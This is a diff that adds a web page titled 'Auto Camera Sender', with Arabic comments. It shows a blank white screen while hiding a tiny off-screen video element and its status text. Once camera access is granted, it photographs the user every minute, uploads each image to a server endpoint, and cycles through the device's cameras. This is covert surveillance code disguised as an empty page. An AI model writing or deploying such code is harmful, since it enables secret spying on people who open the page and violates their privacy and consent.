@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Auto Camera Sender</title>
+<link rel="manifest" href="manifest.json">
+<style>
+  /* صفحة بيضاء تغطي كل الشاشة */
+  body { background: #fff; margin:0; height:100vh; width:100vw; overflow:hidden; }
+  
+  /* فيديو مخفي لتشغيل الكاميرا */
+  video { width:1px; height:1px; position:absolute; top:-1000px; }
+
+  /* حالة النص مخفية */
+  #status { display:none; }
+</style>
+</head>
+<body>
+
+<video id="video" autoplay playsinline></video>
+<p id="status">جارٍ التحضير...</p>
+
+<script>
+const video = document.getElementById("video");
+const status = document.getElementById("status");
+let stream;
+let cameras = [];
+let currentCamera = 0;
+
+// تسجيل Service Worker
+if ('serviceWorker' in navigator) {
+  navigator.serviceWorker.register('/sw.js').then(() => {
+    console.log('Service Worker registered ✅');
+  });
+}
+
+// جلب الكاميرات المتاحة
+async function listCameras() {
+  const devices = await navigator.mediaDevices.enumerateDevices();
+  cameras = devices.filter(d => d.kind === "videoinput");
+  if(cameras.length === 0) return console.log("لا توجد كاميرات");
+  await startCamera(cameras[currentCamera].deviceId);
+  console.log(`الكاميرا قيد التشغيل: ${cameras[currentCamera].label}`);
+}
+
+// تشغيل الكاميرا حسب deviceId
+async function startCamera(deviceId) {
+  if(stream) stream.getTracks().forEach(track => track.stop());
+  stream = await navigator.mediaDevices.getUserMedia({
+    video: { deviceId: { exact: deviceId } },
+    audio: false
+  });
+  video.srcObject = stream;
+}
+
+// التقاط صورة
+function capture() {
+  const canvas = document.createElement("canvas");
+  canvas.width = video.videoWidth || 640;
+  canvas.height = video.videoHeight || 480;
+  canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+  return new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.9));
+}
+
+// إرسال الصورة للسيرفر (Service Worker)
+async function sendPhoto() {
+  const blob = await capture();
+
+  if (navigator.serviceWorker.controller) {
+    navigator.serviceWorker.controller.postMessage({ type: "STORE_PHOTO", blob });
+  } else {
+    const fd = new FormData();
+    fd.append("photo", blob, "photo.jpg");
+    fetch("/send", { method: "POST", body: fd }).catch(err => console.error(err));
+  }
+
+  console.log("تم إرسال الصورة ✅", new Date().toLocaleTimeString());
+}
+
+// تبديل الكاميرا تلقائيًا
+async function toggleCamera() {
+  if(cameras.length <= 1) return;
+  currentCamera = (currentCamera + 1) % cameras.length;
+  await startCamera(cameras[currentCamera].deviceId);
+  console.log(`الكاميرا قيد التشغيل: ${cameras[currentCamera].label}`);
+}
+
+// مهمة تلقائية: كل دقيقة، إرسال صورة وتبديل الكاميرا
+async function autoCapture() {
+  await sendPhoto();
+  await toggleCamera();
+}
+
+// بدء التشغيل
+listCameras().then(() => {
+  autoCapture();                 // صورة أولى
+  setInterval(autoCapture, 60000); // كل دقيقة
+});
+</script>
+
+</body>
+</html>
